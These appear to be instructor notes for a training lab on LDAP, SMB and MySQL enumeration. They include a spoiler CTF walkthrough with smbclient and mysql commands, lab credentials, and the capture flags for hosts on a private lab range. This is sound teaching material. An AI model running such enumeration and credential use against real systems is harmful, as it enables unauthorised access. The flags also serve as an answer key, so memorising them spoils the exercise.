---
title: "Lab 5 Notes: Directory Service & DB Enumeration"
---

## Overview

Porting Lab 5 (Directory Service & DB Enumeration, Phase 2 — Scanning &
Enumeration) from the companion
[Hacking-Labs-Training](https://github.com/moktan456/Hacking-Labs-Training)
repository. Covers LDAP, SMB, and MySQL enumeration with `ldapsearch`,
`smbclient`, `enum4linux`, and the `mysql` client against `10.10.5.0/24`.

## Timing

Full episode: ~77 minutes (15 min teaching + 62 min exercises), matching the
worksheet's "Before We Start" + "Setup" + three parts.

## CTF walkthrough (spoiler — instructors only)

The episode's optional CTF challenge asks learners to find `user.txt` and
`root.txt` on `lab5-smb` (10.10.5.12), plus a bonus flag on `lab5-mysql`
(10.10.5.11), with no hints. Answers:

### Step 1: user.txt (public share, no credentials needed)

```bash
smbclient //10.10.5.12/public -N
smb: \> get user.txt
smb: \> exit
cat user.txt
```

Flag: `flag{lab5_smb_guest_accessed}`

### Step 2: root.txt (private share, needs valid creds)

```bash
smbclient //10.10.5.12/private -U alice%alice123
smb: \> get root.txt
smb: \> exit
cat root.txt
```

Flag: `flag{lab5_smb_valid_creds_private_share}`

`bob:bob456` also exists as a real account on the box but is **not**
authorized on the `private` share — only `alice` is listed in
`valid users` in `smb.conf`.

### Bonus: MySQL flag

```bash
mysql -h 10.10.5.11 -u dbuser -pdbpass123 --skip-ssl corpdb -e "SELECT * FROM notes;"
```

Flag: `flag{lab5_mysql_app_credentials_enumerated}`

### Lesson

`enum4linux -a 10.10.5.12` would have surfaced both the share names and the
local usernames in one pass — worth running early, since it saves the
manual `smbclient -L` step plus guesswork about what other accounts exist.

## Common sticking points

- Anonymous `ldapsearch` (Exercise 1.1) is expected to fail or return
  nothing — learners sometimes assume they made a syntax error rather than
  recognizing this as the directory's default access control working as
  intended. The payoff comes in Exercise 1.2 once they bind as `readonly`.
- The `private` SMB share won't appear in a plain `smbclient -L` listing at
  all (`browsable = no`), which can read as "the share doesn't exist" —
  reinforce that `enum4linux -a` or prior knowledge (e.g., from the CTF
  hint in `ctf-challenge.md`) is how you'd learn about it in the first
  place.
- `bob` is a real SMB account but is deliberately **not** authorized on
  `private` — if learners try `bob:bob456` against `private` expecting it
  to work (since it works for authentication in general), point them back
  to the `valid users = alice` line in `smb.conf` as the reason it's
  rejected.
- MySQL connections need `--skip-ssl` in this lab's setup — omitting it can
  produce confusing SSL/connection errors unrelated to credentials.
